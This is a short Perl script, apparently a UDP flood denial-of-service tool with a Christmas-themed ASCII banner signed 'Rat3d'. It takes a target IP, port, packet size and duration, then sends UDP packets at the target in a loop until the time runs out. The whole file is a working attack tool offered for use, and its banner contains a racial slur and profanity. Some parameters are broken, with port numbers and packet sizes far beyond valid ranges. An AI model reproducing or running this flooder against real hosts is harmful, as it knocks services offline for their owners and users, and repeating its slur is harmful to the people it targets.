#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 
##
# Rated <---
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD BLUE<<EOTEXT;
 
 _______                                                      
|   |   |.-----..----..----..--.--.                          
|       ||  -__||   ||   ||  |  |                          
|__|_|__||_____||__|  |__|  |___  |                          
 _____                  |_____|                          
|    ___|.--.--..----.|  |--.|__|.-----..-----.              
|    ||  |  ||  ||    < |  ||     ||    |              
|  ||____|___|__||__|___|__||___  |              
|      ||  |--..----.|__|.-----.|  |_ .--------..---.-..-----.
|   ---||     ||   ||  || --||   ||        ||    ||_ --|
|______||__|__||__|  |__||_____||____||__|__|__||___._||_____|
 
 Ho, Ho, Ho, Nigga Get Hit Offline - Have Some Presents
Coded by:Rat3d
EOTEXT
 
print "Sending Presents: $ip " . ($port ? $port : "random") . "
Getting Fucked with " .
  ($size ? "$size byte's" : "Error..") . "
Santa Get In My Fucking Sleigh " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}